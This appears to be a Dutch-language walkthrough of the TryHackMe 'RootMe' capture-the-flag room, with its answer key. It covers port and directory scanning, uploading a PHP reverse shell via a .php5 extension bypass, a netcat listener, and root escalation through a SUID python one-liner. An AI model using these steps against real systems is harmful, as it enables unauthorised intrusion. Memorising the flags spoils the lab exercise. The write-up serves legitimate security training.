# RootMe

## Task 1: Deploy the machine
- Activeer machine
- Geen antwoord verder nodig
- Klik op Compleet

## Task 2: Reconnaissance
### Scan the machine, how many ports are open?
>[!Tip]
> Gebruik nmap om de top 100 TCP poorten te scannen

nmap heeft verschillende opties om mee te geven. Standaard geef je best `s` mee om de scan stil te maken. Ook `V` is een goede optie, hiermee krijg je ook de versie terug van de services die draaien op de open poorten. Dit kan helpen voor je aanval gerichter te maken.

```bash
nmap -sV 10.10.97.61 --top-ports 100

```

>[!Note]
> Als je de volledige range wilt scannen, kan je de optie `--top-ports 100` weglaten. En uiteraard vervang je het ip-adres door die voor jou van toepassing is.

#### Resultaat:

![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/nmap_results.png?raw=true)

We zien dat:
- Poort 22 open is voor `OpenSSH versie 7.6p1`
- Poort 80 open is voor `Apache httpd 2.4.29`

#### Antwoord:

```
2
```

### What version of Apache is running?

Omdat we in de vorige stap `V` hebben meegegeven, weten we ook al de versie van Apache.

#### Antwoord:

```
2.4.29
```

### What service is running on port 22?

Ook dit antwoord kunnen we halen uit de resultaten van de eerdere stap.

#### Antwoord:

```
ssh
```

### Find directories using dirb or dirbuster. What is the hidden directory?

Dirbuster en gobuster zijn `dictonairy reconnaissance tools`. Het maakt gebruik van woordenlijsten voor directories op te zoeken. 


##### Dirbuster

```bash
dirbuster dir -u http://10.10.97.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

##### Gobuster

```bash
gobuster dir -u http://10.10.97.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### Resultaat:
Er zijn 2 mappen die niet standaard bij een apache server horen.
- Uploads
- Panel

##### Dirbuster
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/dirbuster.png?raw=true)

##### Gobuster
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/gobuster.png?raw=true)

Aangezien dat `panel` wat abstracter is als `uploads` bekijken we deze.

#### Antwoord:

```
panel
```

## Task 3: Exploitation: Reverse shell

### Which user are you logged in as on the Linux server?

>[!Tip]
> Wat is het command om de huidige gebruiker te weergeven?

Om te starten hebben we toegang nodig tot de server om te zien wie de huidige gebruiker is. Hiervoor slaan we deze stap even over en gaan we over naar de volgende stappen.

Gebruik:
```bash
whoami
```

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/Whoami.png?raw=true)

#### Antwoord:

```
www-data
```



### Download a PHP reverse shell script on your Kali Linux or Attackbox. Google for "PHP reverse shell github". What is the fullname of the php reverse shell script on the githubpage?

>[!Tip]
> Download het PHP reverse shell script op de github pagina van ![pentestmonkey](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/php-reverse-shell.php.) 

#### Antwoord:

```
php-reverse-shell.php
```

### Try to upload the script. Can you upload this script?
Navigeer naar de reeds gevonden `panel` adres van de apache server. (http://10.10.97.61/panel/)
Klik op "Bestand kiezen", voeg de `php-reverse-shell.php` toe en klik op "Upload".

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/Upload_PHP.png?raw=true)

#### Antwoord:
```
No
```

### What error you're getting?
Kopieer het de error message in het rode vak.

#### Antwoord:
```
PHP não é permitido!
```

>[!Note]
> Er is dus beveiliging op het uploaden van `php` bestanden. Maar hoe zit het met andere vormen van php?

### Change the file extension of the script to bypass the filter. Hint: File upload bypass | Hacker's Grimoire (gitbook.io) 
Laten we `php5` proberen.
Verander de naam van het scriptbestand naar `shell.php5` en probeer opnieuw.

### Upload the script again. What text do you see when you can successfully upload the script?

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/Upload_PHP5.png?raw=true)

#### Antwoord:
```
O arquivo foi upado com sucesso!
```

### Establish the reverse shell
Zorg dat het bestand `shell.php5` is aangepast dat `127.0.0.1` is aangepast naar het ip-adres van je aanvallende pc en de poort naar de poort waarop je een listener gaat activeren.

- Open a terminal and launch netcat on port 9001
>[!Warning]
> Gebruik de poort die je hebt ingesteld in het bestand. In dit geval is er `50654` gebruikt.

```bash
nc -lvnp 50654
```
- Navigate to the uploads page on the website and execute the script
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/activate_script.png?raw=true)

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/reverse_shell.png?raw=true)

>[!Tip]
> Nu we een reverse shell hebben kunnen we de eerste stap van Task 3 uitvoeren.

### Find the hidden flag on the Linux system. 

>[!Tip]
> Kijk in de `/var/www/` map.

```bash
ls /var/www/
cat /var/www/user.txt
```
#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/HiddenFlag.png?raw=true)


## Task 4: Post-exploitation: Privilege escalation

### Search for files with SUID permission, which binary has SUID permission and let's u execute scripts?

Gebruik het `find` command om alle bestanden te vinden met een sticky bit om scripts uit te voeren.

```
find / -perm -u=s -type f 2>/dev/null
```

Let op benamingen die met scripting te maken hebben.

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/StickyBit.png?raw=true)

#### Antwoord: 

```
/usr/bin/python
```

### Search on the internet for "gftobins python". What is the URL of the gihub page?

Kopieer onderstaande en plak in de google zoekbalk:
```
gftobins python
```

Het eerste resultaat zou het juiste moeten zijn. Klik op de link en kopieer de URL.

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/gftobins_python.png?raw=true)

#### Antwoord:

```
https://gtfobins.github.io/gtfobins/python/
```

### Search for the file root.txt and open it.

Om te zoeken in de mappen van root en de bestanden te openen hebben we root rechten nodig. Om dit voor elkaar te krijgen maken we gebruik van de rootrechten in python.

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Controleer of je root bent door:
```bash
whoami
```
Zoek nu naar de file:
```bash
find / -type f -name root.txt 2> /dev/null
```

Gebruik `cat` om de inhoud te bekijken
```bash
cat /root/root.txt
```

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/root_txt.png?raw=true)

#### Antwoord:
```
THM{pr1v1l3g3_3sc4l4t10n}
```

### Use the Python command found under the heading SUID.
Gebruik de site die we reeds vonden en zoek naar `SUID`.
Hier vind je een python command.

>[!Tip]
>Zie `python`

#### Resultaat:
![alt text](https://github.com/SvenvG0/THM/blob/main/RootMe/Images/SUID.png?raw=true)

#### Antwoord:
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
